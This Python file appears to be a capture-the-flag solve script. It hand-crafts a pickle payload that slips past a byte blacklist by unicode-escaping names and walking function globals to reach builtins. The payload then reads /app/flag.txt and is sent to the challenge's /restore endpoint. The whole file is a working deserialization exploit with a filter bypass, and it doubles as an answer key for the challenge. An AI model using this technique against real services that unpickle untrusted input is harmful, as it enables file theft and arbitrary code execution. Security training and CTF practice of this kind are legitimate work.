import base64
import json
import re
import sys
import urllib.error
import urllib.request
from pathlib import Path


ROOT = Path(__file__).resolve().parent
BANNED_PATTERNS = (
    b".", b"os", b"system", b"popen", b"subprocess", b"commands",
    b"exec", b"eval", b"import", b"getattr", b"setattr", b"flag",
)


def load_url() -> str:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == "main")
    return endpoint["url"].rstrip("/")


def unicode_opcode(value: str) -> bytes:
    escaped = "".join(f"\\u{ord(char):04x}" for char in value)
    return b"V" + escaped.encode("ascii") + b"\n"


def stack_global(module: str, name: str) -> bytes:
    return unicode_opcode(module) + unicode_opcode(name) + b"\x93"


def reduce_call(callable_pickle: bytes, *args: bytes) -> bytes:
    return callable_pickle + b"(" + b"".join(args) + b"tR"


def builtins_dict() -> bytes:
    getter = stack_global("sessionstore", "render.__globals__.__getitem__")
    return reduce_call(getter, unicode_opcode("__builtins__"))


def builtin(name: str) -> bytes:
    dict_getitem = stack_global(
        "sessionstore", "render.__globals__.__class__.__getitem__"
    )
    return reduce_call(dict_getitem, builtins_dict(), unicode_opcode(name))


def make_payload() -> bytes:
    opened = reduce_call(builtin("open"), unicode_opcode("/app/flag.txt"))
    read_method = reduce_call(builtin("getattr"), opened, unicode_opcode("read"))
    content = reduce_call(read_method)
    printed = reduce_call(builtin("print"), content)
    payload = b"\x80\x04" + printed
    if any(pattern in payload for pattern in BANNED_PATTERNS):
        raise ValueError("generated payload violates the byte filter")
    return payload


def solve() -> bytes:
    body = json.dumps(
        {"payload": base64.b64encode(make_payload()).decode("ascii")}
    ).encode("utf-8")
    request = urllib.request.Request(
        load_url() + "/restore",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        result = json.load(response)
    if not result.get("ok"):
        raise RuntimeError(result.get("error", "restore request failed"))
    match = re.search(r"pwnsec\{[^\r\n}]+\}", result.get("output", ""))
    if not match:
        raise RuntimeError("response did not contain a valid flag")
    return match.group(0).encode("utf-8")


def main() -> None:
    try:
        flag = solve()
    except (
        OSError,
        ValueError,
        KeyError,
        StopIteration,
        RuntimeError,
        urllib.error.URLError,
    ) as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        raise SystemExit(1) from exc
    sys.stdout.buffer.write(flag)


if __name__ == "__main__":
    main()
